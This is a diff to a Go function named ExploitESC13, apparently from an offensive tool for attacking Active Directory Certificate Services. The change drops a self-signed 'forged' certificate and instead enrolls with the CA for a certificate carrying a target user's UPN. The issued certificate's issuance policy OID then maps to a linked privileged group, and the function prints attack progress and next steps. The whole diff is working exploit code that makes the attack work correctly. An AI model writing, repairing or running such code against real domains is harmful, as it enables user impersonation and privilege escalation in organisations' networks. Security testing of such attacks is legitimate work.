@@ -2,8 +2,6 @@ package pki
 
 import (
 	"crypto/ecdsa"
-	"crypto/elliptic"
-	"crypto/rand"
 	"crypto/x509"
 	"fmt"
 	"strings"
@@ -199,23 +197,17 @@ func ExploitESC13(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certif
 	fmt.Printf("[*] Issuance policy OID: %s\n", matchedFinding.IssuancePolicyOID)
 	fmt.Printf("[*] Linked group: %s (%s)\n", matchedFinding.LinkedGroupName, matchedFinding.LinkedGroup)
 
-	// Step 2: Generate key pair for the certificate request
-	signingKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
-	if err != nil {
-		return nil, nil, fmt.Errorf("generate signing key: %w", err)
-	}
-
-	// Step 3: Forge the certificate with the target UPN
+	// Step 2: Enroll for a CA-signed certificate with the target UPN.
 	// The issuance policy OID is embedded by the CA during enrollment based on
 	// the template's msPKI-Certificate-Application-Policy — we don't need to
-	// inject it manually. The forged cert with the target UPN will receive the
-	// linked OID from the template configuration.
-	cert, certKey, err := ForgeCertificate(signingKey, targetUPN)
+	// inject it manually. The enrolled cert will receive the linked OID from
+	// the template configuration.
+	cert, certKey, err := EnrollCertificate(cfg, templateName, targetUPN, false)
 	if err != nil {
-		return nil, nil, fmt.Errorf("forge cert: %w", err)
+		return nil, nil, fmt.Errorf("enrollment failed: %w", err)
 	}
 
-	fmt.Printf("[+] Forged certificate for %s via ESC13 on template %q\n", targetUPN, templateName)
+	fmt.Printf("[+] Certificate obtained for %s via ESC13 on template %q\n", targetUPN, templateName)
 	fmt.Printf("[*] The issued certificate's issuance policy OID (%s) maps to group %s\n",
 		matchedFinding.IssuancePolicyOID, matchedFinding.LinkedGroupName)
 	fmt.Printf("[*] Next steps:\n")
